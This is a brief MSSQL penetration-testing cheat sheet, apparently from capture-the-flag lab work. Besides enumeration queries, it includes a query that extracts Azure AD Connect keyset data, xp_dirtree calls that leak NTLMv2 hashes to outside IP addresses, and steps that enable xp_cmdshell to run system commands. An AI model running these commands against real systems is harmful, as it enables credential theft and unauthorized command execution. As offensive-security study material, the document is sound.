Basic Usage

Show databases

SQL> SELECT name FROM master.sys.databases

Use database

SQL> use volume

Show tables

SQL> SELECT name FROM sysobjects WHERE xtype = 'U'

Query with PowerShell

sqlcmd -S MONTEVERDE(HOST name of the machine) -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"

※MSSQL connection with PowerShell

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=SSPI;"

Privilege Enumeration and Exploitation

List privileges

SQL> SELECT * FROM fn_my_permissions(NULL, 'SERVER');

Send request and get NTLMv2 hash

SQL> xp_dirtree '\\10.10.14.14\a';
SQL> EXEC MASTER.sys.xp_dirtree '\\10.10.16.38\test', 1, 1

Run command

SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
